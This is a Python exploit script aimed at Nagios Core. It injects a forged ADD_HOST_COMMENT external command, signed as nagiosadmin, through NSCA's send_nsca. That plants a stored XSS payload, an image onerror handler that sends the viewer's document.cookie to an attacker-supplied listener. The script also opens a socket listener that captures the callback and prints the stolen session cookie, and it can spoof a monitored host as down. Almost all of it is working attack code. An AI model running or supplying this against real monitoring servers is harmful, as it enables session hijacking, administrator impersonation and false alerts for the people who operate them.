#!/usr/bin/python3

import argparse
import re
import socket
import subprocess
import sys
import time

script_description = (
    "Demonstrate XSS via NSCA command injection\n"
    "Automated injection + cookie listener script targeting Nagios Core"
)


def build_nsca_message(hostname, return_code, output, external_command):
    return f'{hostname}\t{return_code}\t{output}\n{external_command}\n'

def build_external_command(command, hostname, persistent, author, message):
    cur_time = int(time.time())
    return f'[{cur_time}] {command};{hostname};{persistent};{author};{message}'

def build_xss_message(to_display, xss_payload):
    return f'{to_display}</td>{xss_payload}'


def main(target, hostname, config_path, xss_payload):
    display_message = 'visible comment'
    message = build_xss_message(display_message, xss_payload)

    command_type = 'ADD_HOST_COMMENT'
    author = 'nagiosadmin'
    is_persistent = 1
    injected_external_command = build_external_command(command_type, hostname, is_persistent, author, message)

    # NOTE: return_code 0 is up, 1 is down
    # This means we can spoof that the target host (including localhost) is down
    return_code = 1
    nsca_output = 'example output'
    nsca_message = build_nsca_message(hostname, return_code, nsca_output, injected_external_command)
    print(f'[*] NSCA Message with injected payload: "{nsca_message}"')

    send_nsca_path = './send_nsca'
    send_nsca_command = f'{send_nsca_path} -H {target} -c {config_path}'
    print(f'[*] Running command: "{send_nsca_command}"')

    child_process = subprocess.run(
        send_nsca_command.split(),
        input=nsca_message.encode(),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    print(f'[*] Child process return code: {child_process.returncode}')

    if child_process.stdout:
        print(f'    Captured stdout: "{child_process.stdout}"')
        if child_process.stdout == b'1 data packet(s) sent to host successfully.\n':
            print('[+] Success on message send, check the host page for result')

    if child_process.stderr:
        print(f'    Captured stderr: "{child_process.stderr}"')

        if b'Server closed connection before init packet was received\n' in child_process.stderr and \
           b'Could not read init packet from server\n' in child_process.stderr:
            print('[!] This host may not be allowed to talk to the server, check xinetd config')

        elif b'Error: Could not connect to host' in child_process.stderr or \
             b'Error: Timeout after 10 seconds' in child_process.stderr:
            print('[!] Check the following:\n'
                  '      - the server hostname/IP is correct and the server is up\n'
                  '      - the server firewall to ensure the traffic is allowed\n'
                  '      - the nsca process is running on the server and listening on 5667 (not on localhost only).')

        print(f'[!] Non-empty stderr, exiting...')
        exit(1)


if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        sys.argv[0],
        description=script_description,
    )
    parser.add_argument("target", default="localhost",
                        help="Nagios Server IP or hostname")
    parser.add_argument("listener_address", help="Hostname/address to listen on")
    parser.add_argument("-p", "--listener_port", type=int, default=8080,
                        help="Port to listen on")
    parser.add_argument("-n", "--hostname", default="localhost",
                        help="Nagios Client IP or hostname to impersonate")
    parser.add_argument("-c", "--config_file", default="./send_nsca.cfg",
                        help="NSCA send_nsca.cfg (that matches server)")
    parser.add_argument("-d", "--dont_send", action="store_true",
                        help="Don't send any traffic to the server, just listen for callbacks")

    args = parser.parse_args()

    # Session callback payload
    xss_listener_ip, xss_listener_port = args.listener_address, args.listener_port
    if xss_listener_port == 80:
        xss_listener_addr = f'http://{xss_listener_ip}'
    else:
        xss_listener_addr = f'http://{xss_listener_ip}:{xss_listener_port}'
    # Payload that only triggers once
    xss_payload = f'<img src=x onerror="this.src=\'{xss_listener_addr}/?\'+document.cookie; this.removeAttribute(\'onerror\');">'

    # Start listener so we can catch once payload renders
    server_sock = socket.socket()
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind((xss_listener_ip, xss_listener_port))
    server_sock.listen(1)
    print(f'[*] XSS Listener on {xss_listener_ip}:{xss_listener_port}')

    # Plain text payload for testing
    #xss_payload = '<script>alert("radiant cool eyes hallucinating tragedy among the scholars of war")</script>'

    if args.dont_send:
        print('[*] Found --dont_send; not sending anything')
    else:
        main(args.target, args.hostname, args.config_file, xss_payload)

    print('[*] Waiting for callback from target...')
    try:
        client_sock, client_addr = server_sock.accept()
        print(f'[+] Connection from {client_addr}')
        client_data = client_sock.recv(9000)

        cookie_string = ''
        match = re.search(b'GET \/\?([^ ]*) ', client_data)
        if match:
            cookie_string = match.group(1).decode()
        if cookie_string:
            print(f'[+] Session cookie found: "{cookie_string}"')
        else:
            print('[-] No session cookie found')
            print(f'[*] Data received: "{client_data.decode()}"')

        client_sock.close()
        server_sock.close()
    except KeyboardInterrupt:
        print('[!] CTRL+C caught. Quitting!')
